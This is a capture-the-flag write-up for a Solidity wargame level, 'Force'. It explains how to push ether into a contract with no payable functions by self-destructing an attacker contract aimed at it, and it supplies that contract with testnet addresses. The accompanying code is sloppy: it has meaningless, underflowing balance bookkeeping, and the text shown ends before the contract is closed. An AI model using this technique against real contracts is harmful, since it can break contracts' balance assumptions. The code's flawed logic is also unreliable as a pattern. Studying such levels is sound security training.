#TASK 7
-------
//Some contracts will simply not take your money ¯\_(ツ)_/¯

//The goal of this level is to make the balance of the contract greater than zero.
  //Things that might help:
//Fallback methods
//Sometimes the best way to attack a contract is with another contract.
//See the Help page above, section "Beyond the console"

////////////////////////////////////////////
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]

//Solution
//--------
//The above contract is an empty contract with no single state.
//Instance Address given as player are thus:

//Instance address: 0x8116C14aEb3Ad681B95ca6612333876F2C132b8D
//Player address: => 0x283c158251f9f9e54894e5D1172D54EC840775Ba

//Instance Address represents an address where a copy of the contract resides on ropsten network. So the task requires that we increase the ether balance
//in the instance address. Such contract has neither a function nor fallback to receive ether. An option is to directly 
//semding ether to the instance address using the metamask GUI but this transaction will fail based on the reason stated above.
//Another option is self-destructing a contract having ether balance greater than zero. This force-sends all balances in the contract to an address provided
//as argument. 

contract Kill{
    address payable owner;
    uint256 public price;
    
    mapping(address => uint256) public balanceOf;
    
    constructor() public {
        //do nothing;
    }
    function destruct(address payable _addr) public payable {
        selfdestruct(_addr);
    }
    fallback () external payable {
        require(msg.value == price);
        balanceOf[msg.sender] -= msg.value;
        balanceOf[owner] += msg.value;
    }
    function depositEth() public payable returns(bool success){
        require(msg.value == price);
        balanceOf[msg.sender] -= 0.001 ether;
        balanceOf[owner] += 0.001 ether;
        return success;
    }
        
// depositEth()
// destruct()
